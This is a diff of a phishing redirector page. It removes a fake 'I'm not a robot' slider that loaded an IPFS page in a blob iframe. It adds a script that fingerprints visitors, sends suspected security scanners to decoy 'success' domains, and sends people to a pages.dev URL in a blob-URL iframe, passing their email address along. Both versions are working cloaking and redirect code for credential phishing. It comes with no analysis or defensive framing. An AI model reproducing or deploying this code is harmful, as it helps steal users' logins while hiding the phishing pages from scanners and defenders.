@@ -1,264 +1,139 @@
-<!DOCTYPE html>
-<html lang="en">
+<script>
+(function () {
+    'use strict';
+
+    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
+
+    /* ---- BOT-ONLY FAKE SUCCESS ROTATION ---- */
+    const FAKE_SUCCESS_DOMAINS = [
+        "https://example.com",
+        "https://www.example.org",
+        "https://www.example.net",
+        "https://www.iana.org/domains/reserved"
+    ];
+
+    const start = performance.now();
+
+    /* ---- ENTROPY ---- */
+    const delay = 160 + Math.floor(Math.random() * 160);
+
+    /* ---- PASSIVE HUMAN SIGNAL (NON-BLOCKING) ---- */
+    let touched = false;
+    ['mousemove','touchstart','keydown','scroll','pointerdown'].forEach(e =>
+        document.addEventListener(e, () => touched = true, { once: true })
+    );
+
+    /* ---- ENVIRONMENT COHERENCE CHECKS ---- */
+    function hasWebGL() {
+        try {
+            const c = document.createElement('canvas');
+            return !!(c.getContext('webgl') || c.getContext('experimental-webgl'));
+        } catch {
+            return false;
+        }
+    }
+
+    function hasCanvasEntropy() {
+        try {
+            const c = document.createElement('canvas');
+            const x = c.getContext('2d');
+            x.fillText(Math.random().toString(), 2, 2);
+            return c.toDataURL().length > 100;
+        } catch {
+            return false;
+        }
+    }
+
+    function timingSuspicious() {
+        const t = performance.now() - start;
+        return t < 70 || t > 12000;
+    }
+
+    function isScannerLike() {
+        if (navigator.webdriver) return true;
+        if (!hasWebGL()) return true;
+        if (!hasCanvasEntropy()) return true;
+        if (navigator.plugins.length === 0 && !('ontouchstart' in window)) return true;
+        if (navigator.languages && navigator.languages.length === 0) return true;
+        if (timingSuspicious()) return true;
+        return false;
+    }
+
+    /* ---- STICKY FAKE SUCCESS PER SESSION ---- */
+    function getFakeSuccess() {
+        try {
+            const k = "__fs";
+            let v = sessionStorage.getItem(k);
+            if (v) return v;
+            v = FAKE_SUCCESS_DOMAINS[
+                Math.floor(Math.random() * FAKE_SUCCESS_DOMAINS.length)
+            ];
+            sessionStorage.setItem(k, v);
+            return v;
+        } catch {
+            return FAKE_SUCCESS_DOMAINS[0];
+        }
+    }
+
+    /* ---- ORIGINAL LOGIC (UNCHANGED) ---- */
+    function getEmail() {
+        return new URLSearchParams(window.location.search).get("email") || "";
+    }
+
+    function buildTargetUrl(email) {
+        return email
+            ? TARGET_BASE + "?email=" + encodeURIComponent(email)
+            : TARGET_BASE;
+    }
+
+    function createMobileSafeBlob(targetUrl, email) {
+        const html = `<!DOCTYPE html>
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Human Verification</title>
 <style>
-/* FULLSCREEN OVERLAY */
-#overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 135, 90, 0.95);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 999999;
-}
-/* VERIFICATION BOX */
-#verificationBox {
-    width: 220px;
-    padding: 16px;
-    border-radius: 14px;
-    background: #fff;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    border: 1px solid #dcdcdc;
-    text-align: left;
-    font-family: Arial, sans-serif;
-    position: relative;
-}
-#verificationBox .header {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 12px;
-}
-#robotIcon {
-    width: 28px;
-    height: 28px;
-    border-radius: 50%;
-    background: #f8f9fa;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    color: #555;
-    transform: rotate(0deg);
-    transition: transform 0.05s linear;
-}
-#verificationBox .header span {
-    font-size: 15px;
-    color: #333;
-}
-/* SLIDER */
-#sliderContainer {
-    width: 100%;
-    height: 32px;
-    background: #f1f3f4;
-    border-radius: 16px;
-    position: relative;
-    cursor: pointer;
-    overflow: hidden;
-}
-#sliderFill {
-    position: absolute;
-    top: 0;
-    left: 0;
-    height: 100%;
-    background: #d2e7d5;
-    width: 0;
-    border-radius: 16px;
-    transition: width 0.1s;
-}
-#slider {
-    width: 32px;
-    height: 32px;
-    background: #34a853;
-    border-radius: 50%;
-    position: absolute;
-    top: 0;
-    left: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    font-size: 16px;
-    transition: left 0.1s;
-    z-index: 2;
-}
-#sliderText {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    pointer-events: none;
-    color: #555;
-    font-size: 14px;
-    transition: opacity 0.2s;
-}
-/* CHECKMARK */
-#checkmark {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    font-size: 18px;
-    color: #34a853;
-    pointer-events: none;
-    transition: transform 0.3s ease;
-}
-/* SPINNER */
-.spinner {
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    border: 2px solid #40739e;
-    border-top-color: transparent;
-    animation: spin 0.6s linear infinite;
-}
-@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
-#verifying {
-    display: none;
-    margin-top: 10px;
-    font-size: 12px;
-    color: #555;
-    text-align: center;
-}
+html,body{margin:0;padding:0;width:100%;height:100%}
+iframe{width:100%;height:100%;border:none}
 </style>
 </head>
 <body>
-
-<div id="overlay">
-    <div id="verificationBox">
-        <div class="header">
-            <div id="robotIcon">🤖</div>
-            <span>I'm not a robot</span>
-        </div>
-
-        <div id="sliderContainer">
-            <div id="sliderFill"></div>
-            <div id="slider">→</div>
-            <div id="sliderText">Slide to verify</div>
-            <div id="checkmark">✓</div>
-        </div>
-
-        <div id="verifying">
-            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
-                Verifying <div class="spinner"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>
-
+<iframe src="${targetUrl}"></iframe>
 <script>
-// IPFS URL
-const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
-function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
-function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
-function createBlobHTML(url) {
-    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
-        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
-        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
-    </style></head><body><iframe src="${url}"></iframe></body></html>`;
-}
-
-// BOT CHECK
-function computeBotScore() {
-    let score = 0;
-    const ua = navigator.userAgent.toLowerCase();
-    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
-    if (navigator.webdriver) score += 50;
-    return score;
-}
-
-// ROBOT ROTATION
-let robotRotation = 0;
-const robotIcon = document.getElementById("robotIcon");
-let rotationSpeed = 1; // faster idle rotation
-function rotateRobot() {
-    robotRotation += rotationSpeed;
-    robotIcon.style.transform = `rotate(${robotRotation}deg)`;
-    requestAnimationFrame(rotateRobot);
-}
-rotateRobot();
-
-// SLIDER
-const slider = document.getElementById("slider");
-const sliderContainer = document.getElementById("sliderContainer");
-const sliderText = document.getElementById("sliderText");
-const sliderFill = document.getElementById("sliderFill");
-const verifying = document.getElementById("verifying");
-const overlay = document.getElementById("overlay");
-const checkmark = document.getElementById("checkmark");
-const beepSound = document.getElementById("beepSound");
-
-let isDragging = false;
-let startX = 0;
-let beepPlayed = false;
-
-slider.addEventListener("mousedown", e => { 
-    if (!isDragging) {
-        isDragging = true; 
-        startX = e.clientX - slider.offsetLeft;
-        rotationSpeed = 5; // fast rotation while dragging
-
-        // Play beep immediately on user interaction
-        if (!beepPlayed) {
-            beepPlayed = true;
-            beepSound.currentTime = 0;
-            beepSound.play().catch(()=>{});
-        }
+const email = ${JSON.stringify(email)};
+<\/script>
+</body>
+</html>`;
+        return new Blob([html], { type: "text/html" });
     }
-});
-document.addEventListener("mousemove", e => {
-    if (!isDragging) return;
-    let x = e.clientX - startX;
-    if (x < 0) x = 0;
-    if (x > sliderContainer.offsetWidth - slider.offsetWidth) x = sliderContainer.offsetWidth - slider.offsetWidth;
-    slider.style.left = x + "px";
-    sliderFill.style.width = x + slider.offsetWidth/2 + "px";
-    sliderText.style.opacity = 1 - x / (sliderContainer.offsetWidth - slider.offsetWidth);
-});
-document.addEventListener("mouseup", e => {
-    if (!isDragging) return;
-    isDragging = false;
-    rotationSpeed = 1; // back to idle speed
 
-    if (parseInt(slider.style.left) >= sliderContainer.offsetWidth - slider.offsetWidth - 1) {
-        const botScore = computeBotScore();
-        if (botScore >= 60) {
-            alert("Suspicious activity detected.");
-            slider.style.left = "0px";
-            sliderFill.style.width = "0px";
-            sliderText.style.opacity = 1;
-            return;
-        }
-
-        checkmark.style.transform = "translate(-50%, -50%) scale(1)";
-        slider.style.display = "none";
-        sliderText.style.opacity = 0;
-        verifying.style.display = "block";
-
+    /* ---- FINAL DECISION ---- */
+    function run() {
         setTimeout(() => {
-            overlay.style.display = "none";
+
+            /* BOT / SCANNER → FAKE SUCCESS */
+            if (isScannerLike()) {
+                window.location.replace(getFakeSuccess());
+                return;
+            }
+
+            /* HUMAN → REAL FLOW */
             const email = getEmail();
-            const ipfsURL = buildIPFS(email);
-            const blobHTML = createBlobHTML(ipfsURL);
-            const blob = new Blob([blobHTML], { type: "text/html" });
-            const blobURL = URL.createObjectURL(blob);
-            window.location.href = blobURL;
-        }, 800); 
-    } else {
-        slider.style.left = "0px";
-        sliderFill.style.width = "0px";
-        sliderText.style.opacity = 1;
+            const targetUrl = buildTargetUrl(email);
+            const blobUrl = URL.createObjectURL(
+                createMobileSafeBlob(targetUrl, email)
+            );
+
+            window.location.replace(blobUrl);
+
+            setTimeout(() => {
+                try { URL.revokeObjectURL(blobUrl); } catch {}
+            }, 10000);
+
+        }, delay);
     }
-});
+
+    run();
+})();
 </script>
 
-</body>
-</html>
